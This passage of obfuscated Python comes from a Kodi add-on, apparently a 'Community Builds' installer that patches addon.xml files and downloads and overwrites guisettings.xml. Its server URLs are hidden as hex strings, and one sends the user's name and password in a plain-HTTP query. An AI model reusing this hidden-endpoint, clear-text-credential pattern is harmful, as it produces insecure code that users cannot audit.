   Ii1I11i11I1i = iI1iIiiI [ Oo0OOo ] . split ( '=' )
   if ( len ( Ii1I11i11I1i ) ) == 2 :
    iIii1I [ Ii1I11i11I1i [ 0 ] ] = Ii1I11i11I1i [ 1 ]
    if 59 - 59: o0oO
 return iIii1I
 if 48 - 48: O0OOO * OoO0O00 * II11iII . II11iII * Oo000o - OoO0O00
def iIi11i ( ) :
 Iii = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 ooOo = xbmcgui . DialogProgress ( )
 ooOo . create ( "Gotham Addon Fix" , "Please wait whilst your addons" , '' , 'are being made Gotham compatible.' )
 for OO0oOO0ooO in glob . glob ( os . path . join ( Iii , '*.*' ) ) :
  for file in glob . glob ( os . path . join ( OO0oOO0ooO , '*.*' ) ) :
   if 'addon.xml' in file :
    ooOo . update ( 0 , "Fixing" , file , 'Please Wait' )
    ooO00O0O0 = open ( file ) . read ( )
    OoO0O0oO00 = ooO00O0O0 . replace ( 'addon="xbmc.python" version="1.0"' , 'addon="xbmc.python" version="2.1.0"' ) . replace ( 'addon="xbmc.python" version="2.0"' , 'addon="xbmc.python" version="2.1.0"' )
    IiI11i1IIiiI = open ( file , mode = 'w' )
    IiI11i1IIiiI . write ( str ( OoO0O0oO00 ) )
    IiI11i1IIiiI . close ( )
    if 56 - 56: i11iIiiIii . oO00Oo0o000 / ooOO0o
 IiI = xbmcgui . Dialog ( )
 IiI . ok ( "Your addons have now been made compatible" , "If you still find you have addons that aren't working please run the addon so it throws up a script error, upload a log and post details on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] so the team can look into it. Thank you." )
 if 48 - 48: II11iII * oOOoO0O0O0 + Ii1iIIIi1ii / I1i1iii
 if 100 - 100: Oo000o
def OOO0oOO0ooo0 ( ) :
 IiI = xbmcgui . Dialog ( )
 iI1Ii = xbmcgui . Dialog ( ) . yesno ( 'Convert Addons To Gotham' , 'This will edit your addon.xml files so they show as Gotham compatible. It\'s doubtful this will have any effect on whether or not they work but it will get rid of the annoying incompatible pop-up message. Do you wish to continue?' )
 if iI1Ii == 0 :
  return
 elif iI1Ii == 1 :
  iIi11i ( )
  if 53 - 53: OoO0O00 - O0OOO / iii11I111 % ooOO0o * iiIi % oOOoO0O0O0
  if 69 - 69: Ooo0Oo0
def oOOO0ooo ( url ) :
 if OO0o . getSetting ( 'adult' ) == 'true' :
  iIi1I1 = 'yes'
 else :
  iIi1I1 = 'no'
 I1III1iIi = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f736f727462792e7068703f736f7274783d6e616d6526757365723d257326706173733d2573266164756c743d2573262573'
 OoO00O0 = binascii . unhexlify ( I1III1iIi ) % ( OOOo0 , Oooo000o , iIi1I1 , url )
 ooOOoooooo = II1I ( OoO00O0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'name="(.+?)" <br> downloads="(.+?)" <br> icon="(.+?)" <br> UID="(.+?)" <br>' , re . DOTALL ) . findall ( ooOOoooooo )
 I1Iii ( OoO00O0 , 'addons' )
 for ooooooo00o , OOoOO0ooo , oOoO00o , i1i11ii1Ii in oOOO00o000o :
  Ii ( 'folder2' , ooooooo00o + '[COLOR=lime] [' + OOoOO0ooo + ' downloads][/COLOR]' , i1i11ii1Ii , 'addon_final_menu' , oOoO00o , '' , '' )
  if 12 - 12: oOOoO0O0O0 . OoO0O00
  if 79 - 79: i1OOO / iiiIi1i1I / ooOO0o . i1OOO * Iii1i1I11I + iii11I111
def ooOoooo0 ( url ) :
 if zip == '' :
  IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' , '' , '' )
  OO0o . openSettings ( sys . argv [ 0 ] )
 oO00oO = xbmc . getInfoLabel ( "System.BuildVersion" )
 IIIIiiIiiI = float ( oO00oO [ : 4 ] )
 if IIIIiiIiiI < 14 :
  OoO = 'gotham'
 else :
  OoO = 'helix'
  if 71 - 71: II11iII - Iii1i1I11I * iiiIi1i1I
 if OO0o . getSetting ( 'adult' ) == 'true' :
  iIi1I1 = ''
 else :
  iIi1I1 = 'no'
 ii1ii1IiiiiIi1I = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f736f727462792e7068703f736f7274783d6e616d65266f72646572783d4153432678626d633d2573266164756c743d2573262573'
 OoO00O0 = binascii . unhexlify ( ii1ii1IiiiiIi1I ) % ( OoO , iIi1I1 , url )
 ooOOoooooo = II1I ( OoO00O0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> Thumbnail="(.+?)" <br> Fanart="(.+?)" <br> downloads="(.+?)" <br> <br>' , re . DOTALL ) . findall ( ooOOoooooo )
 I1Iii ( url , 'communitybuilds' )
 for ooooooo00o , id , ooo0O0o0OoOO , iIi11io0o00o0Oo , OOoOO0ooo in oOOO00o000o :
  Oo0oOOo ( ooooooo00o + '[COLOR=lime] (' + OOoOO0ooo + ' downloads)[/COLOR]' , id + url , 'community_menu' , ooo0O0o0OoOO , iIi11io0o00o0Oo , id , '' , '' , '' , '' )
  if 79 - 79: OoOo + II11iII - I1i1iii + OoO0O00
  if 11 - 11: OOO00OoOO00 + Ii1iIIIi1ii
def i1ooOoo000oO ( url ) :
 i1I1iI = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4861726477617265506f7274616c2f736f727462792e7068703f736f7274783d4164646564266f72646572783d44455343262573'
 OoO00O0 = binascii . unhexlify ( i1I1iI ) % ( url )
 ooOOoooooo = II1I ( OoO00O0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> thumb="(.+?)" <br><br>' , re . DOTALL ) . findall ( ooOOoooooo )
 I1Iii ( OoO00O0 , 'hardware' )
 for ooooooo00o , id , oOOoO in oOOO00o000o :
  Ii ( 'folder2' , ooooooo00o , id , 'hardware_final_menu' , oOOoO , '' , '' )
  if 87 - 87: OoOo % Ii1iIIIi1ii
  if 72 - 72: oOOoO0O0O0 . oOOoO0O0O0 - Ooo0Oo0
def III1II1i ( url ) :
 iI1i1IiIIIIi = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4c61746573744e6577732f736f727462792e7068703f736f7274783d6974656d5f64617465266f72646572783d44455343262573'
 OoO00O0 = binascii . unhexlify ( iI1i1IiIIIIi ) % ( url )
 ooOOoooooo = II1I ( OoO00O0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'name="(.+?)" <br> date="(.+?)" <br> source="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( ooOOoooooo )
 for ooooooo00o , OooOooO0O0o0 , OOO0o0 , id in oOOO00o000o :
  if "OpenELEC" in OOO0o0 :
   Ii ( '' , ooooooo00o + '  (' + OooOooO0O0o0 + ')' , id , 'news_menu' , 'OpenELEC.png' , '' , '' )
  if "Official" in OOO0o0 :
   Ii ( '' , ooooooo00o + '  (' + OooOooO0O0o0 + ')' , id , 'news_menu' , 'XBMC.png' , '' , '' )
  if "Raspbmc" in OOO0o0 :
   Ii ( '' , ooooooo00o + '  (' + OooOooO0O0o0 + ')' , id , 'news_menu' , 'Raspbmc.png' , '' , '' )
  if "XBMC4Xbox" in OOO0o0 :
   Ii ( '' , ooooooo00o + '  (' + OooOooO0O0o0 + ')' , id , 'news_menu' , 'XBMC4Xbox.png' , '' , '' )
  if "TotalXBMC" in OOO0o0 :
   Ii ( '' , ooooooo00o + '  (' + OooOooO0O0o0 + ')' , id , 'news_menu' , 'TOTALXBMC.png' , '' , '' )
   if 34 - 34: iiIi % iiiIi1i1I - OoOo + ooOO0o
   if 79 - 79: I1i1iii - oO00Oo0o000 . o0oO + O0OOO % O0OOO * iiIi
def Ii1Ii1I ( url ) :
 oOO0ooOo00O0OO = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f5475746f7269616c506f7274616c2f736f727462792e7068703f736f7274783d4e616d65266f72646572783d415343262573'
 OoO00O0 = binascii . unhexlify ( oOO0ooOo00O0OO ) % ( url )
 ooOOoooooo = II1I ( OoO00O0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'name="(.+?)" <br> about="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( ooOOoooooo )
 I1Iii ( OoO00O0 , 'tutorials' )
 for ooooooo00o , oOOOoo0o , id in oOOO00o000o :
  Ii ( 'folder' , ooooooo00o , id , 'tutorial_final_menu' , 'TotalXBMC_Guides.png' , '' , oOOOoo0o )
  if 44 - 44: O0OOO % o0oO
  if 42 - 42: I1i1iii - II11iII - Iii1i1I11I . ooOO0o / OoOo
def ooooo0Oo0 ( url , local ) :
 IIIiIi ( )
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( ooooooo00o , 'This will over-write your existing guisettings.xml.' , 'Are you sure this is the build you have installed?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if iIII1I1i1i == 0 :
  return
 elif iIII1I1i1i == 1 :
  o0OIIiI1I1 ( url , local )
  if 97 - 97: O0oO . OOO00OoOO00 . O0oO
  if 91 - 91: oOOoO0O0O0 + i1OOO . Oo000o
def o0OIIiI1I1 ( url , local ) :
 i1I111i1ii = 0
 oO0oOoo0O = 1
 if os . path . exists ( II ) :
  os . remove ( II )
 if os . path . exists ( i1 ) :
  os . remove ( i1 )
 if os . path . exists ( oOo0oooo00o ) :
  os . remove ( oOo0oooo00o )
 if not os . path . exists ( ooOoOoo0O ) :
  os . makedirs ( ooOoOoo0O )
 ooOo . create ( "Community Builds" , "Downloading guisettings.xml" , '' , 'Please Wait' )
 shutil . copyfile ( o0oOoO00o , II )
 if local != 1 :
  II1iI11 = os . path . join ( oO , 'guifix.zip' )
  downloader . download ( url , II1iI11 , ooOo )
 else :
  II1iI11 = xbmc . translatePath ( url )
 O00o0O ( II1iI11 )
 ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
 ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
 iIIII1iIIii ( II1iI11 , ooOoOoo0O , ooOo )
 try :
  O00oOo0O0o00O = open ( ooOoOoo0O + 'profiles.xml' , mode = 'r' )
  ooo0oo00O00Oo = O00oOo0O0o00O . read ( )
  O00oOo0O0o00O . close ( )
  if os . path . exists ( ooOoOoo0O + 'profiles.xml' ) :
   iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( "PROFILES DETECTED" , 'This build has profiles included, would you like to overwrite' , 'your existing profiles or keep the ones you have?' , '' , nolabel = 'Keep my profiles' , yeslabel = 'Use new profiles' )
   if iIII1I1i1i == 0 :
    pass
   elif iIII1I1i1i == 1 :
    OOO000000OOO0 = open ( oOo0oooo00o , mode = 'w' )
    time . sleep ( 1 )
    OOO000000OOO0 . write ( ooo0oo00O00Oo )
    time . sleep ( 1 )
    OOO000000OOO0 . close ( )
    oO0oOoo0O = 0
 except : print "no profiles.xml file"
 os . rename ( ooOoOoo0O + 'guisettings.xml' , i1 )
 if 74 - 74: O0OOO . OOO00OoOO00 - OoO0O00
 time . sleep ( 1 )
 ooOoO = open ( II , mode = 'r' )
 oOoOOOo = file . read ( ooOoO )
 file . close ( ooOoO )
 iiiiI1111 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oOoOOOo )
 OO0o0 = iiiiI1111 [ 0 ] if ( len ( iiiiI1111 ) > 0 ) else ''
 OOo0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oOoOOOo )
 O00O = OOo0 [ 0 ] if ( len ( OOo0 ) > 0 ) else ''
 Oo0oOOooO0o0O = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oOoOOOo )
 oo0o00oOo0 = Oo0oOOooO0o0O [ 0 ] if ( len ( Oo0oOOooO0o0O ) > 0 ) else ''
 O0OOo = open ( i1 , mode = 'r' )
 i1I1Iiii1 = file . read ( O0OOo )
 file . close ( O0OOo )
 O0ooooo000 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( i1I1Iiii1 )
 OooOoOO0OO = O0ooooo000 [ 0 ] if ( len ( O0ooooo000 ) > 0 ) else ''
 I1iiIiiii1111 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( i1I1Iiii1 )
 I1ii1i11i = I1iiIiiii1111 [ 0 ] if ( len ( I1iiIiiii1111 ) > 0 ) else ''
 Oooooo0O00o = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( i1I1Iiii1 )
 II11ii1 = Oooooo0O00o [ 0 ] if ( len ( Oooooo0O00o ) > 0 ) else ''
 ii1II1II = oOoOOOo . replace ( OO0o0 , OooOoOO0OO ) . replace ( oo0o00oOo0 , II11ii1 ) . replace ( O00O , I1ii1i11i )
 OOO000000OOO0 = open ( II , mode = 'w+' )
 OOO000000OOO0 . write ( str ( ii1II1II ) )
 OOO000000OOO0 . close ( )
 if os . path . exists ( o0oOoO00o ) :
  try :
   os . remove ( o0oOoO00o )
   i11i11II11i = True
  except :
   IiI . ok ( "Oops we have a problem" , 'There was an error trying to complete this process.' , 'Please try this step again, if it still fails you may' , 'need to restart Kodi and try again.' )
   i11i11II11i = False
 try :
  os . rename ( II , o0oOoO00o )
  os . remove ( i1 )
 except :
  pass
 if i11i11II11i == True :
  try :
   ooOoO = open ( i1iIIi1 , mode = 'r' )
   oOoOOOo = file . read ( ooOoO )
   file . close ( ooOoO )
   II1Ii1I1i = re . compile ( 'id="(.+?)"' ) . findall ( oOoOOOo )
   OOooOooo0OOo0 = II1Ii1I1i [ 0 ] if ( len ( II1Ii1I1i ) > 0 ) else ''
   oo0o0OoOO0o0 = re . compile ( 'name="(.+?)"' ) . findall ( oOoOOOo )
   III1III11II = oo0o0OoOO0o0 [ 0 ] if ( len ( oo0o0OoOO0o0 ) > 0 ) else ''
   iIi1iI = re . compile ( 'version="(.+?)"' ) . findall ( oOoOOOo )
   o0 = iIi1iI [ 0 ] if ( len ( iIi1iI ) > 0 ) else ''
   OOO000000OOO0 = open ( ii11iIi1I , mode = 'w+' )
   OOO000000OOO0 . write ( 'id="' + str ( OOooOooo0OOo0 ) + '"\nname="' + III1III11II + '"\nversion="' + o0 + '"' )
   OOO000000OOO0 . close ( )
   ooOoO = open ( i1iiIII111ii , mode = 'r' )
   oOoOOOo = file . read ( ooOoO )
   file . close ( ooOoO )
   OO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( oOoOOOo )
   IIiiiiiIiIIi = OO0Oo [ 0 ] if ( len ( OO0Oo ) > 0 ) else ''
   ii1II1II = oOoOOOo . replace ( IIiiiiiIiIIi , o0 )
   OOO000000OOO0 = open ( i1iiIII111ii , mode = 'w' )
   OOO000000OOO0 . write ( str ( ii1II1II ) )
   OOO000000OOO0 . close ( )
   os . remove ( i1iIIi1 )
  except :
   OOO000000OOO0 = open ( ii11iIi1I , mode = 'w+' )
   OOO000000OOO0 . write ( 'id="None"\nname="Unknown"\nversion="Unknown"' )
   OOO000000OOO0 . close ( )
 if os . path . exists ( ooOoOoo0O + 'profiles.xml' ) :
  os . remove ( ooOoOoo0O + 'profiles.xml' )
 if oO0oOoo0O == 0 :
  IiI . ok ( "PROFILES DETECTED" , 'Unfortunately the only way to get the new profiles to stick is' , 'to force close kodi. Either do this via the task manager,' , 'terminal or system settings. DO NOT use the quit/exit options in Kodi.' )
  iiIiiIi1 ( )
 else :
  if i11i11II11i == True :
   IiI . ok ( "guisettings.xml fix complete" , 'Please restart Kodi. If the skin doesn\'t look' , 'quite right on the next boot you may need to' , 'force close Kodi.' )
 if os . path . exists ( ooOoOoo0O ) :
  os . removedirs ( ooOoOoo0O )
 I1Ii11i = xbmc . translatePath ( os . path . join ( i1i1II , 'plugin.program.totalinstaller' , 'notification.txt' ) )
 if os . path . exists ( I1Ii11i ) :
  os . remove ( I1Ii11i )
  if 19 - 19: O0oO - iii11I111 . Ii1iIIIi1ii . OoOo / oOOoO0O0O0
  if 87 - 87: OoOo - oO00Oo0o000 - oOOoO0O0O0 + iiiIi1i1I % Ii1iIIIi1ii / i11iIiiIii
def i1iIIII1iiIIi ( url ) :
 i1I1IiI1ii = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4861726477617265506f7274616c2f686172647761726564657461696c732e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( i1I1IiI1ii ) % ( url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
 O00OOoOOOO00O = re . compile ( 'manufacturer="(.+?)"' ) . findall ( ooOOoooooo )
 iIIi1IIi = re . compile ( 'video_guide1="(.+?)"' ) . findall ( ooOOoooooo )
 i111i11I1ii = re . compile ( 'video_guide2="(.+?)"' ) . findall ( ooOOoooooo )
 OOooo = re . compile ( 'video_guide3="(.+?)"' ) . findall ( ooOOoooooo )
 oo0 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( ooOOoooooo )
 oOOII1i11i1iIi11 = re . compile ( 'video_guide5="(.+?)"' ) . findall ( ooOOoooooo )
 oo0O0oO0O0O = re . compile ( 'video_label1="(.+?)"' ) . findall ( ooOOoooooo )
 oOo0O = re . compile ( 'video_label2="(.+?)"' ) . findall ( ooOOoooooo )
 I11i = re . compile ( 'video_label3="(.+?)"' ) . findall ( ooOOoooooo )
 Iiii1 = re . compile ( 'video_label4="(.+?)"' ) . findall ( ooOOoooooo )
 iIIIiiiI11I = re . compile ( 'video_label5="(.+?)"' ) . findall ( ooOOoooooo )
 Ooo0OOO = re . compile ( 'shops="(.+?)"' ) . findall ( ooOOoooooo )
 o0OiiiI1i11Ii = re . compile ( 'description="(.+?)"' ) . findall ( ooOOoooooo )
 ooooOoo0OO = re . compile ( 'screenshot1="(.+?)"' ) . findall ( ooOOoooooo )
 Oo0O0000Oo00o = re . compile ( 'screenshot2="(.+?)"' ) . findall ( ooOOoooooo )
 II1ii = re . compile ( 'screenshot3="(.+?)"' ) . findall ( ooOOoooooo )
 o00iIiiiII = re . compile ( 'screenshot4="(.+?)"' ) . findall ( ooOOoooooo )
 Ii1I1 = re . compile ( 'screenshot5="(.+?)"' ) . findall ( ooOOoooooo )
 OO0ooO0 = re . compile ( 'screenshot6="(.+?)"' ) . findall ( ooOOoooooo )
 OoOooOO0oOOo0O = re . compile ( 'screenshot7="(.+?)"' ) . findall ( ooOOoooooo )
 I1II = re . compile ( 'screenshot8="(.+?)"' ) . findall ( ooOOoooooo )
 iIIi1Ii1III = re . compile ( 'screenshot9="(.+?)"' ) . findall ( ooOOoooooo )
 Oooo00 = re . compile ( 'screenshot10="(.+?)"' ) . findall ( ooOOoooooo )
 iii1II1iI1IIi = re . compile ( 'screenshot11="(.+?)"' ) . findall ( ooOOoooooo )
 Ii11iiI1 = re . compile ( 'screenshot12="(.+?)"' ) . findall ( ooOOoooooo )
 oO0OOOoooO00o0o = re . compile ( 'screenshot13="(.+?)"' ) . findall ( ooOOoooooo )
 I1ii1Ii1 = re . compile ( 'screenshot14="(.+?)"' ) . findall ( ooOOoooooo )
 OoOoO = re . compile ( 'added="(.+?)"' ) . findall ( ooOOoooooo )
 OOooooO0Oo = re . compile ( 'platform="(.+?)"' ) . findall ( ooOOoooooo )
 iI111I1III = re . compile ( 'chipset="(.+?)"' ) . findall ( ooOOoooooo )
 i111IiiI1Ii = re . compile ( 'official_guide="(.+?)"' ) . findall ( ooOOoooooo )
 OooOOOOOo = re . compile ( 'official_preview="(.+?)"' ) . findall ( ooOOoooooo )
 i1I11ii = re . compile ( 'thumbnail="(.+?)"' ) . findall ( ooOOoooooo )
 o0ooO00O0O = re . compile ( 'stock_rom="(.+?)"' ) . findall ( ooOOoooooo )
 iiiI1iI1 = re . compile ( 'CPU="(.+?)"' ) . findall ( ooOOoooooo )
 I1oOoO0OOO00O = re . compile ( 'GPU="(.+?)"' ) . findall ( ooOOoooooo )
 OOOOO0o0OOo = re . compile ( 'RAM="(.+?)"' ) . findall ( ooOOoooooo )
 I11I11I11IiIi = re . compile ( 'flash="(.+?)"' ) . findall ( ooOOoooooo )
 OOii1ii1i11I1I = re . compile ( 'wifi="(.+?)"' ) . findall ( ooOOoooooo )
 iiII1iiiiiii = re . compile ( 'bluetooth="(.+?)"' ) . findall ( ooOOoooooo )
 iiIiii = re . compile ( 'LAN="(.+?)"' ) . findall ( ooOOoooooo )
 iiI1ii = re . compile ( 'xbmc_version="(.+?)"' ) . findall ( ooOOoooooo )
 O0OooOO = re . compile ( 'pros="(.+?)"' ) . findall ( ooOOoooooo )
 i1i1 = re . compile ( 'cons="(.+?)"' ) . findall ( ooOOoooooo )
 o0oOoOo0 = re . compile ( 'library_scan="(.+?)"' ) . findall ( ooOOoooooo )
 III1IiI1i1i = re . compile ( '4k="(.+?)"' ) . findall ( ooOOoooooo )
 o0OOOOOo0 = re . compile ( '1080="(.+?)"' ) . findall ( ooOOoooooo )
 oooOoO = re . compile ( '720="(.+?)"' ) . findall ( ooOOoooooo )
 O0Oo0 = re . compile ( '3D="(.+?)"' ) . findall ( ooOOoooooo )
 iIIIi1IiI11I1 = re . compile ( 'DTS="(.+?)"' ) . findall ( ooOOoooooo )
 O0Ooo000 = re . compile ( 'BootTime="(.+?)"' ) . findall ( ooOOoooooo )
 IIi11iI1Iii = re . compile ( 'CopyFiles="(.+?)"' ) . findall ( ooOOoooooo )
 IiIi1i = re . compile ( 'CopyVideo="(.+?)"' ) . findall ( ooOOoooooo )
 i11ii = re . compile ( 'EthernetTest="(.+?)"' ) . findall ( ooOOoooooo )
 oOOOOO0Ooooo = re . compile ( 'Slideshow="(.+?)"' ) . findall ( ooOOoooooo )
 o0o000Oo = re . compile ( 'total_review="(.+?)"' ) . findall ( ooOOoooooo )
 oO0o0O0o0OO00 = re . compile ( 'whufclee_review="(.+?)"' ) . findall ( ooOOoooooo )
 iIiiiIi = re . compile ( 'CB_Premium="(.+?)"' ) . findall ( ooOOoooooo )
 if 74 - 74: O0OOO + Iii1i1I11I / OOO00OoOO00 / OoOo . Ooo0Oo0 % OOO00OoOO00
 ooooooo00o = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
 iiIi11I1IIiiii = O00OOoOOOO00O [ 0 ] if ( len ( O00OOoOOOO00O ) > 0 ) else ''
 O00Ooo = iIIi1IIi [ 0 ] if ( len ( iIIi1IIi ) > 0 ) else 'None'
 OOOO0OOO = i111i11I1ii [ 0 ] if ( len ( i111i11I1ii ) > 0 ) else 'None'
 i1i1ii = OOooo [ 0 ] if ( len ( OOooo ) > 0 ) else 'None'
 iII1ii1 = oo0 [ 0 ] if ( len ( oo0 ) > 0 ) else 'None'
 I1i1iiiI1 = oOOII1i11i1iIi11 [ 0 ] if ( len ( oOOII1i11i1iIi11 ) > 0 ) else 'None'
 O0OOooOoO = oo0O0oO0O0O [ 0 ] if ( len ( oo0O0oO0O0O ) > 0 ) else 'None'
 i1II1I1Iii1 = oOo0O [ 0 ] if ( len ( oOo0O ) > 0 ) else 'None'
 iiI11Iii = I11i [ 0 ] if ( len ( I11i ) > 0 ) else 'None'
 O0o0O0 = Iiii1 [ 0 ] if ( len ( Iiii1 ) > 0 ) else 'None'
 Ii1II1I11i1 = iIIIiiiI11I [ 0 ] if ( len ( iIIIiiiI11I ) > 0 ) else 'None'
 o0OI1 = Ooo0OOO [ 0 ] if ( len ( Ooo0OOO ) > 0 ) else ''
 IIIII1 = o0OiiiI1i11Ii [ 0 ] if ( len ( o0OiiiI1i11Ii ) > 0 ) else ''
 oo0oOO = ooooOoo0OO [ 0 ] if ( len ( ooooOoo0OO ) > 0 ) else ''
 i1II11IiiiI = Oo0O0000Oo00o [ 0 ] if ( len ( Oo0O0000Oo00o ) > 0 ) else ''
 IIIi = II1ii [ 0 ] if ( len ( II1ii ) > 0 ) else ''
 Ii1iiI1 = o00iIiiiII [ 0 ] if ( len ( o00iIiiiII ) > 0 ) else ''
 o0ooOOoO0oO0 = Ii1I1 [ 0 ] if ( len ( Ii1I1 ) > 0 ) else ''
 oo00I1IiI1IIiI = OO0ooO0 [ 0 ] if ( len ( OO0ooO0 ) > 0 ) else ''
 oooo = OoOooOO0oOOo0O [ 0 ] if ( len ( OoOooOO0oOOo0O ) > 0 ) else ''
 o0o0oo0Ooo = I1II [ 0 ] if ( len ( I1II ) > 0 ) else ''
 iI1i = iIIi1Ii1III [ 0 ] if ( len ( iIIi1Ii1III ) > 0 ) else ''
 i11I = Oooo00 [ 0 ] if ( len ( Oooo00 ) > 0 ) else ''
 o0oO0o0oo0O0 = iii1II1iI1IIi [ 0 ] if ( len ( iii1II1iI1IIi ) > 0 ) else ''
 O0oo00oOOO0o = Ii11iiI1 [ 0 ] if ( len ( Ii11iiI1 ) > 0 ) else ''
 II1i = oO0OOOoooO00o0o [ 0 ] if ( len ( oO0OOOoooO00o0o ) > 0 ) else ''
 I111iiIIiI1I = I1ii1Ii1 [ 0 ] if ( len ( I1ii1Ii1 ) > 0 ) else ''
 ooO00Oo = OoOoO [ 0 ] if ( len ( OoOoO ) > 0 ) else ''
 o0o0 = OOooooO0Oo [ 0 ] if ( len ( OOooooO0Oo ) > 0 ) else ''
 Iiii1Ii1I = iI111I1III [ 0 ] if ( len ( iI111I1III ) > 0 ) else ''
 oooOOOOOi1iIii = i111IiiI1Ii [ 0 ] if ( len ( i111IiiI1Ii ) > 0 ) else 'None'
 o0O0ooooooo00 = OooOOOOOo [ 0 ] if ( len ( OooOOOOOo ) > 0 ) else 'None'
 oOOoO = i1I11ii [ 0 ] if ( len ( i1I11ii ) > 0 ) else ''
 I1111ii11IIII = o0ooO00O0O [ 0 ] if ( len ( o0ooO00O0O ) > 0 ) else ''
 IiIi1II111I = iiiI1iI1 [ 0 ] if ( len ( iiiI1iI1 ) > 0 ) else ''
 o00oIIi1i1 = I1oOoO0OOO00O [ 0 ] if ( len ( I1oOoO0OOO00O ) > 0 ) else ''
 o0O0Ooo = OOOOO0o0OOo [ 0 ] if ( len ( OOOOO0o0OOo ) > 0 ) else ''
 O0oO00oOOooO = I11I11I11IiIi [ 0 ] if ( len ( I11I11I11IiIi ) > 0 ) else ''
 IiIIii1iiI = OOii1ii1i11I1I [ 0 ] if ( len ( OOii1ii1i11I1I ) > 0 ) else ''
 ii1IiiII = iiII1iiiiiii [ 0 ] if ( len ( iiII1iiiiiii ) > 0 ) else ''
 IiiI1II1II1i = iiIiii [ 0 ] if ( len ( iiIiii ) > 0 ) else ''
 oO00oO = iiI1ii [ 0 ] if ( len ( iiI1ii ) > 0 ) else ''
 iIO0OO0o0O00oO = O0OooOO [ 0 ] if ( len ( O0OooOO ) > 0 ) else ''
 o00O = i1i1 [ 0 ] if ( len ( i1i1 ) > 0 ) else ''
 oO0o0oOo = o0oOoOo0 [ 0 ] if ( len ( o0oOoOo0 ) > 0 ) else ''
 OoO0O0oo0o = III1IiI1i1i [ 0 ] if ( len ( III1IiI1i1i ) > 0 ) else ''
 iIi11I11 = o0OOOOOo0 [ 0 ] if ( len ( o0OOOOOo0 ) > 0 ) else ''
 i1i = oooOoO [ 0 ] if ( len ( oooOoO ) > 0 ) else ''
 oOI11 = O0Oo0 [ 0 ] if ( len ( O0Oo0 ) > 0 ) else ''
 iiIi1iIii1i111 = iIIIi1IiI11I1 [ 0 ] if ( len ( iIIIi1IiI11I1 ) > 0 ) else ''
 OOooo000OooO = O0Ooo000 [ 0 ] if ( len ( O0Ooo000 ) > 0 ) else ''
 o0o0OoOo = IIi11iI1Iii [ 0 ] if ( len ( IIi11iI1Iii ) > 0 ) else ''
 IiI1 = IiIi1i [ 0 ] if ( len ( IiIi1i ) > 0 ) else ''
 iiIiII = i11ii [ 0 ] if ( len ( i11ii ) > 0 ) else ''
 IIiiiI1iI = oOOOOO0Ooooo [ 0 ] if ( len ( oOOOOO0Ooooo ) > 0 ) else ''
 O0O0 = o0o000Oo [ 0 ] if ( len ( o0o000Oo ) > 0 ) else ''
 O0oO0o0OOOOOO = oO0o0O0o0OO00 [ 0 ] if ( len ( oO0o0O0o0OO00 ) > 0 ) else 'None'
 IiI1i11IiIiii = iIiiiIi [ 0 ] if ( len ( iIiiiIi ) > 0 ) else ''
